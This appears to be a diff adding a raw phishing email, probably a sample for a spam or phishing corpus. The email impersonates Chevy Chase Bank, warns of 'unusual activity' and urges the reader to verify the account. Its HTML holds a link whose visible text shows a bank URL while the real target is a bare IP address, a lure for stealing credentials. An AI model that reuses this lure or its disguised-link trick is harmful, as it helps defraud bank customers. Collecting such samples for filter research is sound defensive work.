@@ -1,0 +1,95 @@
+From nobody Sun Jan 25 13:49:55 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 1CCC82A88C
+ for <user@example.com>; Sun, 17 Jul 2005 02:32:27 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 0285D621C9A; Sun, 17 Jul 2005 02:32:27 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id D9D60621C92
+ for <user@example.com>; Sun, 17 Jul 2005 02:32:26 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id CAA19464
+ for user@example.com; Sun, 17 Jul 2005 02:32:26 -0400
+Received: from ns.cwplus.com (ns.cwplus.com [69.0.243.52])
+ by mail.example.com with ESMTP id CAA19456
+ for <user@biochemistry.BIOC.cwru.edu>; Sun, 17 Jul 2005 02:32:26 -0400
+Received: from User ([82.79.184.24]) (authenticated bits=0)
+ by ns.cwplus.com (8.12.11/8.12.11) with ESMTP id j6H6UKWq006487;
+ Sun, 17 Jul 2005 02:30:23 -0400
+Message-Id: <200507170630.j6H6UKWq006487@ns.cwplus.com>
+From: "Chevy Chase Bank" <accounts@chevychase.com>
+Subject: Chevy Chase Bank: Unusual activity in your account !
+Date: Sat, 16 Jul 2005 23:31:48 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Content-Length: 2846
+Lines: 55
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 36
+
+<META HTTP-EQUIV="Expires" CONTENT="-1">
+<META http-equiv=Content-Type content="text/html; charset=windows-1250">
+<STYLE>P {
+	FONT-SIZE: 8pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+BODY {
+	FONT-SIZE: 8pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+TD {
+	FONT-SIZE: 8pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+H2 {
+	FONT-WEIGHT: bold; FONT-SIZE: 16pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+H3 {
+	FONT-WEIGHT: bold; FONT-SIZE: 12pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+.TDError {
+	FONT-WEIGHT: bold; FONT-SIZE: 12pt; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+</STYLE>
+<LINK href="files/Guaranty.css" type=text/css 
+rel=stylesheet>
+
+<META content="Microsoft FrontPage 5.0" name=GENERATOR></HEAD>
+<BODY bgColor=#ffffff>
+<p>
+<img src="http://www.chevychasebank.com/img/ccb_logo.gif" width="151" height="41"></p>
+<p><font face="Arial, Helvetica, sans-serif" size="3">Dear Customer, </font> </p>
+<p><font face="Arial, Helvetica, sans-serif" size="3">We are contacting you to 
+  remind you that our Account Review Team identified some unusual activity in 
+  your account. In accordance with Chevy Chase Bank's User Agreement and to ensure 
+  that your account has not been compromised, access to your account was limited. 
+  Your account access will remain limited until this issue has been resolved. 
+  We encourage you to sign on and perform the steps necessary to restore your 
+  account access as soon as possible. Allowing your account access to remain limited 
+  for an extended period of time may result in further limitations on the use 
+  of your account and possible account closure. To view and perform the verification 
+  process, please click on the link below:</font></p>
+<p><font size="3" face="Arial, Helvetica, sans-serif"><b>
+<a href="http://218.188.9.4/.cgi-bin/banking.chevychasebank.com/cgi-bin/Banking/2/brtest/DoBrowserCheck.jspBV_UseBVCookie=no&phase=2&login=login&cookiesupport=true&brtest=/">https://banking.chevychasebank.com/login.html?User=verification</a></b></font></p>
+<p><font face="Arial, Helvetica, sans-serif" size="3">Chevy Chase Bank is committed 
+  to maintaining a safe environment for our customers. To protect the security 
+  of your account, our bank employs some of the most advanced security systems 
+  in the world and our anti-fraud teams regularly screen the Online Banking system 
+  for unusual activity. </font></p>
+<p><font face="Arial, Helvetica, sans-serif" size="3">Thank you for your prompt 
+  attention to this matter. Please understand that this is a <font color="#FF0000">security 
+  measure</font> meant to help protect you and your account. We apologize for 
+  any inconvenience. </font></p>
+<p><font face="Arial, Helvetica, sans-serif" size="3">Sincerely, <br>
+  Chevy Chase Bank, Customer Service.</font></p>
+</BODY></HTML>
+ 
+XCTDTCJCNGNRKCNVGQNZCDPFNQERWBDETTOEFX
